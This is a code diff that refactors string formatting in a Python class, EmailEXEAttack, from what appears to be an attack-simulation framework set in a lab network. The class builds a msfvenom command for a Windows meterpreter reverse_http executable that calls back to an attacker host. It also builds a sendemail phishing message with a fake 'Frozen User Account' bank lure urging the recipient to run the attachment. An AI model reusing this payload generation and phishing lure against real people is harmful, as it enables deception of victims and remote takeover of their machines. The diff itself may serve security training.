@@ -47,17 +47,20 @@ class EmailEXEAttack(Attack):
     def _generate_exe_command(self):
         lhost = self.options.lhost
         lport = self.options.lport
-        meterpreter_script = f"msfvenom -p windows/x64/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe"
+        meterpreter_script = ("msfvenom -p windows/x64/meterpreter/reverse_http "
+                              f"LHOST={lhost} LPORT={lport} -a x64 StagerRetryCount=604800 "
+                              "-f exe-only -o /root/Bank-of-Nuthington.exe")
         return meterpreter_script
 
     def _sendemail_command(self, message):
+        address = self.options.addr
         return " ".join([
             "sendemail",
             "-f attacker@localdomain",
-            "-t {addr}".format(addr=self.options.addr),
+            f"-t {address}",
             "-s 172.18.0.2",
             "-u 'Frozen User Account'",
-            "-m '{msg}'".format(msg=message),
+            f"-m '{message}'",
             "-a '/root/Bank-of-Nuthington.exe'",
             "-o tls=no",
             "-o message-content-type=html",
@@ -65,9 +68,10 @@ class EmailEXEAttack(Attack):
             ""])
 
     def _email_body(self):
+        name = self.options.name
         return (
             "<p><img src=\"http://172.18.1.1/email_header.jpg\" width=\"1100\" height=\"300\"></p>"
-            "<p>Dear {name},</p>"
+            f"<p>Dear {name},</p>"
             "<p>our Technical Support Team unfortunately had to freeze your bank account."
             "   Please download and execute the file provided in the attachment for further"
             "   information.</p>"
@@ -75,4 +79,4 @@ class EmailEXEAttack(Attack):
             "   collaboration. This is an automated e-mail. Please do not respond.</p>"
             "<p><img src=\"http://172.18.1.1/email_footer.jpg\" width=\"90\" height=\"90\"></p>"
             "<p>&copy; 2017 bankofnuthington.co.uk. All Rights Reserved.</p>"
-            "".format(name=self.options.name))
+            "")
